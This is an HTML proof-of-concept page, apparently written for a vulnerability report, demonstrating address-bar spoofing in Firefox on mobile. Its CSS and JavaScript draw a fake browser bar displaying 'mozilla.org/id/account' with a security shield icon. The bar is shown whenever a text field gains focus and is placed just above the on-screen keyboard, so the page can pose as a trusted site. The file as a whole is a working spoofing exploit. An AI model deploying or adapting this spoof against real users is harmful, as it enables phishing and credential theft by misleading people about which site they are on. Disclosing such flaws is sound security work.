<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>PoC - Firefox Browser UI Spoofing</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: white; 
      color: black;
    }

    button { padding: 12px 18px; font-size: 16px; margin-bottom: 10px; cursor: pointer; }
    textarea { width: 100%; font-size: 18px; padding: 10px; margin-top: 20px; box-sizing: border-box; border: 1px solid #ccc; }

    .fake-bar-outer-rect {
      position: fixed;
      width: 100%;
      left: 0;
      z-index: 9999;
      background-color: #1c1b22;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s ease, bottom 0.2s ease;
      pointer-events: none;
      box-sizing: border-box;
      padding: 10px 14px;
    }

    .fake-bar-outer-rect.show { 
      opacity: 1; 
      visibility: visible; 
    }

    .firefox-inner-flex {
      display: flex;
      align-items: center;
      justify-content: space-between;
      width: 100%;
      height: 50px;
    }

    .firefox-url-pill {
      background-color: #2b2a33;
      border-radius: 25px;
      height: 46px;
      display: flex;
      align-items: center;
      flex-grow: 1;
      margin-right: 15px;
      padding: 0 15px;
      overflow: hidden;
      position: relative;
    }

    .shield-icon {
      width: 20px;
      height: 20px;
      margin-right: 12px;
      flex-shrink: 0;
    }

    .url-text-wrapper {
      white-space: nowrap;
      overflow: hidden;
      color: #fbfbfe;
      font-size: 17px;
      position: relative;
      width: 100%;
    }

    .url-text-wrapper::after {
      content: "";
      position: absolute;
      right: 0;
      top: 0;
      height: 100%;
      width: 40px;
      background: linear-gradient(to right, transparent, #2b2a33);
    }

    .firefox-icons-right {
      display: flex;
      align-items: center;
      gap: 18px;
      padding-right: 5px;
    }

    .plus-icon {
      font-size: 28px;
      color: #fbfbfe;
      font-weight: 300;
    }

    .firefox-tabs {
      width: 20px;
      height: 20px;
      border: 2px solid #fbfbfe;
      border-radius: 4px;
      color: #fbfbfe;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      font-weight: bold;
    }

    .kebab-menu {
      display: flex;
      flex-direction: column;
      gap: 3px;
    }

    .kebab-dot {
      width: 3.5px;
      height: 3.5px;
      background-color: #fbfbfe;
      border-radius: 50%;
    }

    .spacer { height: 800px; }
    .spacer-bottom { height: 1200px; }
    .bottom-text { font-size: 18px; text-align: center; margin: 20px; color: #aaa; }
  </style>
</head>
<body>

  <h2>Vulnerability PoC by k4tedu</h2>
  <p>Scroll down to hide the address bar, then tap the textarea.</p>

  <button id="showBtn">Show Keyboard</button>
  <textarea id="ta" placeholder="Top input..."></textarea>

  <div class="fake-bar-outer-rect" id="fakeBar">
    <div class="firefox-inner-flex">
      
      <div class="firefox-url-pill">
        <svg class="shield-icon" viewBox="0 0 24 24" fill="none" stroke="#fbfbfe" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
          <path d="M9 12l2 2 4-4"></path>
        </svg>
        <div class="url-text-wrapper">
          mozilla.org/id/account
        </div>
      </div>

      <div class="firefox-icons-right">
        <div class="plus-icon">+</div>
        <div class="firefox-tabs">1</div>
        <div class="kebab-menu">
          <div class="kebab-dot"></div>
          <div class="kebab-dot"></div>
          <div class="kebab-dot"></div>
        </div>
      </div>

    </div>
  </div>

  <div class="spacer"></div>
  <textarea id="middleTa" placeholder="Middle input..."></textarea>
  <div class="spacer-bottom"></div>
  
  <div class="bottom-text">End of Page</div>

  <script>
    const fakeBar = document.getElementById('fakeBar');
    const ta = document.getElementById('ta');
    const middleTa = document.getElementById('middleTa');

    function adjustFakeBar() {
      const vv = window.visualViewport;
      if (vv) {
        const keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
        fakeBar.style.bottom = (keyboardHeight > 0 ? keyboardHeight : 0) + 'px';
      }
    }

    function showFakeBar() {
      fakeBar.classList.add('show');
      adjustFakeBar();
    }

    function hideFakeBar() {
      fakeBar.classList.remove('show');
    }

    if ('visualViewport' in window) {
      window.visualViewport.addEventListener('resize', adjustFakeBar);
    }

    document.getElementById("showBtn").onclick = () => {
      ta.focus();
      showFakeBar();
    };

    ta.addEventListener('focus', showFakeBar);
    middleTa.addEventListener('focus', showFakeBar);
    ta.addEventListener('blur', hideFakeBar);
    middleTa.addEventListener('blur', hideFakeBar);
  </script>
</body>
</html>
